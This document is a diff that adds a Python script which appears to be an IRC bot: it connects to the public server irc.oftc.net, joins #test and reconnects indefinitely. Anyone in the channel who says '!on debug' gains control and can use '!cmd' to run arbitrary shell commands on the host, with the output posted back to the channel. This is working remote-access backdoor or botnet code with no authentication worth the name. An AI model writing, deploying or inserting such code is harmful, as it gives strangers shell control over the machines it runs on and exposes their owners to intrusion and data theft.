@@ -1,0 +1,139 @@
+import socket, ssl, subprocess, sys, time, threading
+
+def irc():
+    try:
+        port = [6697, 7000, 7070, 9999, 6665, 6666, 6667, 8000, 8001, 8002]
+        id = 0
+        while True:
+            if (id < 10):
+                try:
+                    for line in socket.getaddrinfo(socket.gethostbyname("irc.oftc.net"), port[id], socket.AF_UNSPEC, socket.SOCK_STREAM):
+                        addressFamily, socketKind, protocol, canonName, servAddr = line
+                    if id <= 3:
+                        sock = socket.socket(addressFamily, socketKind, protocol)
+                        sock.connect(servAddr)
+                        irc = ssl.wrap_socket(sock)
+                        irc.do_handshake()
+                        break
+                    else:
+                        irc = socket.socket(addressFamily, socketKind, protocol)
+                        irc.connect(servAddr)
+                        break
+                except:
+                    cmd = sys.exc_info()
+                    for line in cmd:
+                        print(line)
+                    id += 1
+            else:
+                return
+
+        del port
+
+        ident = socket.gethostname() + '_'
+        id = 1
+        nick = ident + str(id)
+
+        irc.send(bytes("nick " + nick + "\r\n", "utf-8"))
+        irc.send(bytes("user " + nick + " * * :" + nick + "\r\n", "utf-8"))
+
+        while True:
+            line = str(irc.recv(4096))
+            if line == '':
+                return
+            elif line.find("004") != -1:
+                break
+            elif line.find("433") != -1:
+                id += 1
+                nick = ident + str(id)
+                irc.send(bytes("nick " + nick + "\r\n", "utf-8"))
+                irc.send(bytes("user " + nick + " * * :" + nick + "\r\n", "utf-8"))
+
+        irc.send(bytes("join #test\r\n", "utf-8"))
+
+        del ident
+    except:
+        return
+
+    roots = []
+    while True:
+        try:
+            line = str(irc.recv(256))
+            if line == '':
+                return
+            elif line.startswith("b'PING"):
+                irc.send(bytes("PONG" + line[6:-1], "utf-8"))
+            elif line.find(" :!") != -1:
+                id = contains(roots, line[line.index("!~") + 2:line.index(' ')])
+                if (id != -1):
+                    line = line[line.index('#'):-5]
+                    chan = line[:line.index(' ')]
+                    line = line[line.index(" :!") + 2:]
+                    if line.startswith("!cmd"):
+                        cmd(irc, chan, line[5:]).start()
+                    elif line.startswith("!ping"):
+                        irc.send(bytes("PRIVMSG " + chan + " :pong\r\n", "utf-8"))
+                    elif line.startswith("!irc"):
+                        irc.send(bytes(line[4:] + "\r\n", "utf-8"))
+                    elif line.startswith("!off"):
+                        del roots[id]
+                        irc.send(bytes("PRIVMSG " + chan + " :Logged out!\r\n", "utf-8"))
+                    elif line.startswith("!who"):
+                        line = ""
+                        for r in roots:
+                            line += ' ' + r
+                        irc.send(bytes("PRIVMSG " + chan + " :Roots:" + line + "\r\n", "utf-8"))
+                    elif line.startswith("!reco"):
+                        irc.send(bytes("quit\r\n", "utf-8"))
+                        return
+                    elif line.startswith("!join"):
+                        irc.send(bytes("join" + line[5:] + "\r\n", "utf-8"))
+                    elif line.startswith("!part"):
+                        if line.find('#') != -1:
+                            irc.send(bytes("part" + line[5:] + "\r\n", "utf-8"))
+                        else:
+                            irc.send(bytes("part " + chan + "\r\n", "utf-8"))
+                    elif line.startswith("!quit"):
+                        irc.send(bytes("quit\r\n", "utf-8"))
+                        exit()
+                elif (line[line.index(" :!") + 2:-5] == "!on debug"):
+                    roots.append(line[line.index("!~") + 2:line.index(' ')])
+                    line = line[line.index('#'):-5]
+                    chan = line[:line.index(' ')]
+                    irc.send(bytes("PRIVMSG " + chan + " :Logged!\r\n", "utf-8"))
+        except:
+            try:
+                line = sys.exc_info()
+                for l in line:
+                    irc.send(bytes("PRIVMSG " + chan + " :Error: " + str(l) + "\r\n", "utf-8"))
+            except:
+                pass
+
+def contains(list, str):
+    try:
+        return list.index(str)
+    except:
+        return -1
+
+class cmd(threading.Thread):
+    def __init__(self, irc, chan, cmd):
+        threading.Thread.__init__(self)
+        self.irc = irc
+        self.chan = chan
+        self.cmd = cmd + " 2>&1"
+
+    def run(self):
+        try:
+            self.cmd = str(subprocess.check_output(self.cmd, shell=True))[2:-1].replace("\\n", '\n').splitlines()
+            for line in self.cmd:
+                self.irc.send(bytes("PRIVMSG " + self.chan + " :" + line + "\r\n", "utf-8"))
+        except:
+            self.cmd = sys.exc_info()
+            for line in self.cmd:
+                self.irc.send(bytes("PRIVMSG " + self.chan + " :Error: " + str(line) + "\r\n", "utf-8"))
+        return
+
+if __name__ == "__main__":
+    while True:
+        irc()
+        time.sleep(5)
+    
